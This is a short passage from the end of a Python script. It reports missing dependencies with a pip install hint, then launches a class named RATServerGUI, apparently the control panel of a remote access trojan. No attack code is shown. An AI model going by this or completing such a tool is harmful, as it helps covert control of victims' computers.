                "\n".join(f"- {module}" for module in missing_modules) +
                "\n\nInstall using: pip install " + " ".join(missing_modules)
            )
            
            root.destroy()
        except:
            print("Error: Missing dependencies:", ", ".join(missing_modules))
            print("Install using: pip install", " ".join(missing_modules))
        
        exit(1)
    
    # Start application
    app = RATServerGUI()
    app.run()
    